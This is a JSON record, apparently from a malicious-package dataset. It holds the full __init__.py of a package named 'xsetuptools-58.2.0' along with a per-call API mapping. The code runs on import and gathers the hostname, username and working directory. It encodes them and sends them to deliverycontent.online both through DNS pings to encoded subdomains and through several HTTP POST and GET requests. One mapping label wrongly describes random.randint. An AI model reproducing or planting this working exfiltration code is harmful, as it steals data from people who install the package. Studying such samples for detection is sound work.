[
  {
    "pyfile": "__init__.py",
    "code_snippet": "import os\nimport base64\nimport random\n\ndns_domain = \".sub.deliverycontent.online\"\nhttp_domain = \"www.deliverycontent.online\"\n\nhostname = \"\"\ntry:\n    hostname = os.uname().nodename\nexcept Exception:\n    pass\nif hostname == \"\":\n    try:\n        hostname = os.environ['COMPUTERNAME']\n    except Exception:\n        pass\n\nusername = \"\"\ntry:\n    import getpass\n    username = getpass.getuser()\nexcept Exception:\n    pass\n\nexecution_path = \"\"\ntry:\n    execution_path = os.getcwd()\nexcept Exception:\n    pass\n\ndata = \"%s;%s;%s;%s\" % (hostname, username, \"xsetuptools_58.2.0\", execution_path)\nb64data = base64.b64encode(data.encode()).decode()\n\ndata_part_length = 29\nparts_count = len(b64data) // data_part_length\nif len(b64data) % data_part_length > 0:\n    parts_count += 1\nparts_count = min(parts_count, 255)\n\nrandom_number = random.randint(0, 254)\n\nencoded_data = \"\"\nfor c in b64data[:data_part_length]:\n    encoded_data += \"%02x\" % ord(c)\ndata_to_send = \"f%s%s%s\" % (\"%02x\" % random_number, \"%02x\" % parts_count, encoded_data)\ndomain = data_to_send + dns_domain\ntry:\n    os.system(\"ping %s\" % domain)\nexcept Exception:\n    pass\n\nfor i in range(1, parts_count):\n    encoded_data = \"\"\n    for c in b64data[data_part_length*i: data_part_length*(i+1)]:\n        encoded_data += \"%02x\" % ord(c)\n    data_to_send = \"%s%s%s\" % (\"%02x\" % random_number, \"%02x\" % i, encoded_data)\n    domain = data_to_send + dns_domain\n    try:\n        os.system(\"ping %s\" % domain)\n    except Exception: \n        pass\n\nencoded_data = \"\"\nfor c in b64data:\n    encoded_data += \"%02x\" % ord(c)\ndata_post = \"%s%s%s\" % (\"gjeiiq1\", \"%02x\" % random_number, encoded_data)\ndata_get = \"%s%s\" % (\"%02x\" % random_number, encoded_data)\n\ntry:\n    import urllib.request\n    r = urllib.request.urlopen(\"http://%s/p\" % http_domain, data=data_post.encode(), timeout=10)\nexcept Exception:\n    pass\n\ntry:\n    import urllib.request\n    r = urllib.request.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\nexcept Exception:\n    pass\n\ntry:\n    import requests\n    r = requests.post(\"http://%s/p\" % http_domain, data=data_post, timeout=10)\nexcept Exception:\n    pass\n\ntry:\n    import requests\n    r = requests.get(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\nexcept Exception:\n    pass\n\ntry:\n    import urllib\n    r = urllib.urlopen(\"http://%s/p\" % http_domain, data=data_post)\nexcept Exception:\n    pass\n\ntry:\n    import urllib\n    r = urllib.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get))\nexcept Exception:\n    pass",
    "pattern_analysis": {
      "api_sequence": [
        "os.uname",
        "os.environ.__getitem__",
        "getpass.getuser",
        "os.getcwd",
        "base64.b64encode",
        "str.encode",
        "bytes.decode",
        "random.randint",
        "ord",
        "os.system",
        "ord",
        "os.system",
        "ord",
        "os.system",
        "base64.b64encode",
        "str.encode",
        "bytes.decode",
        "ord",
        "urllib.request.urlopen",
        "str.encode",
        "urllib.request.urlopen",
        "requests.post",
        "requests.get",
        "urllib.urlopen",
        "urllib.urlopen"
      ],
      "api_sequence_with_args": [
        "os.uname()",
        "os.environ['COMPUTERNAME']",
        "getpass.getuser()",
        "os.getcwd()",
        "base64.b64encode(data.encode())",
        "data.encode()",
        "base64.b64encode(...).decode()",
        "random.randint(0, 254)",
        "ord(c)",
        "os.system(\"ping %s\" % domain)",
        "ord(c)",
        "os.system(\"ping %s\" % domain)",
        "ord(c)",
        "os.system(\"ping %s\" % domain)",
        "base64.b64encode(data.encode())",
        "data.encode()",
        "base64.b64encode(...).decode()",
        "ord(c)",
        "urllib.request.urlopen(\"http://%s/p\" % http_domain, data=data_post.encode(), timeout=10)",
        "data_post.encode()",
        "urllib.request.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)",
        "requests.post(\"http://%s/p\" % http_domain, data=data_post, timeout=10)",
        "requests.get(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)",
        "urllib.urlopen(\"http://%s/p\" % http_domain, data=data_post)",
        "urllib.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get))"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.uname",
          "id": "get_os_info",
          "description": "Retrieves operating system information",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "os.environ.__getitem__",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "getpass.getuser",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "base64.b64encode",
          "id": "encode_bytes_to_base64",
          "description": "Encodes bytes to base64-encoded bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "bytes.decode",
          "id": "decode_bytes_default",
          "description": "Decodes bytes using default codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "random.randint",
          "id": "apply_lambda_elements",
          "description": "Applies lambda to elements of two lists",
          "first_id": "data_transformation_processing",
          "second_id": "function_application",
          "third_id": "lambda_application"
        },
        {
          "api_name": "ord",
          "id": "convert_char_to_int",
          "description": "Converts character to integer Unicode code point",
          "first_id": "data_transformation_processing",
          "second_id": "type_conversion",
          "third_id": "string_conversion"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "ord",
          "id": "convert_char_to_int",
          "description": "Converts character to integer Unicode code point",
          "first_id": "data_transformation_processing",
          "second_id": "type_conversion",
          "third_id": "string_conversion"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "ord",
          "id": "convert_char_to_int",
          "description": "Converts character to integer Unicode code point",
          "first_id": "data_transformation_processing",
          "second_id": "type_conversion",
          "third_id": "string_conversion"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "base64.b64encode",
          "id": "encode_bytes_to_base64",
          "description": "Encodes bytes to base64-encoded bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "bytes.decode",
          "id": "decode_bytes_default",
          "description": "Decodes bytes using default codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "ord",
          "id": "convert_char_to_int",
          "description": "Converts character to integer Unicode code point",
          "first_id": "data_transformation_processing",
          "second_id": "type_conversion",
          "third_id": "string_conversion"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_post_timeout",
          "description": "Opens URL with POST data and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_get_timeout",
          "description": "Opens URL with GET parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post_timeout",
          "description": "Sends HTTP POST request with data and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "urllib.urlopen",
          "id": "open_url_post",
          "description": "Opens URL with POST data",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "urllib.urlopen",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        }
      ],
      "contextual_code": "import os\nimport base64\nimport random\n\ndns_domain = \".sub.deliverycontent.online\"\nhttp_domain = \"www.deliverycontent.online\"\n\nhostname = \"\"\ntry:\n    hostname = os.uname().nodename\nexcept Exception:\n    pass\nif hostname == \"\":\n    try:\n        hostname = os.environ['COMPUTERNAME']\n    except Exception:\n        pass\n\nusername = \"\"\ntry:\n    import getpass\n    username = getpass.getuser()\nexcept Exception:\n    pass\n\nexecution_path = \"\"\ntry:\n    execution_path = os.getcwd()\nexcept Exception:\n    pass\n\ndata = \"%s;%s;%s;%s\" % (hostname, username, \"xsetuptools_58.2.0\", execution_path)\nb64data = base64.b64encode(data.encode()).decode()\n\ndata_part_length = 29\nparts_count = len(b64data) // data_part_length\nif len(b64data) % data_part_length > 0:\n    parts_count += 1\nparts_count = min(parts_count, 255)\n\nrandom_number = random.randint(0, 254)\n\nencoded_data = \"\"\nfor c in b64data[:data_part_length]:\n    encoded_data += \"%02x\" % ord(c)\ndata_to_send = \"f%s%s%s\" % (\"%02x\" % random_number, \"%02x\" % parts_count, encoded_data)\ndomain = data_to_send + dns_domain\ntry:\n    os.system(\"ping %s\" % domain)\nexcept Exception:\n    pass\n\nfor i in range(1, parts_count):\n    encoded_data = \"\"\n    for c in b64data[data_part_length*i: data_part_length*(i+1)]:\n        encoded_data += \"%02x\" % ord(c)\n    data_to_send = \"%s%s%s\" % (\"%02x\" % random_number, \"%02x\" % i, encoded_data)\n    domain = data_to_send + dns_domain\n    try:\n        os.system(\"ping %s\" % domain)\n    except Exception: \n        pass\n\nencoded_data = \"\"\nfor c in b64data:\n    encoded_data += \"%02x\" % ord(c)\ndata_post = \"%s%s%s\" % (\"gjeiiq1\", \"%02x\" % random_number, encoded_data)\ndata_get = \"%s%s\" % (\"%02x\" % random_number, encoded_data)\n\ntry:\n    import urllib.request\n    r = urllib.request.urlopen(\"http://%s/p\" % http_domain, data=data_post.encode(), timeout=10)\nexcept Exception:\n    pass\n\ntry:\n    import urllib.request\n    r = urllib.request.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\nexcept Exception:\n    pass\n\ntry:\n    import requests\n    r = requests.post(\"http://%s/p\" % http_domain, data=data_post, timeout=10)\nexcept Exception:\n    pass\n\ntry:\n    import requests\n    r = requests.get(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\nexcept Exception:\n    pass\n\ntry:\n    import urllib\n    r = urllib.urlopen(\"http://%s/p\" % http_domain, data=data_post)\nexcept Exception:\n    pass\n\ntry:\n    import urllib\n    r = urllib.urlopen(\"http://%s/g?d=%s\" % (http_domain, data_get))\nexcept Exception:\n    pass"
    }
  },
  {
    "metadata": {
      "package_name": "xsetuptools-58.2.0"
    }
  }
]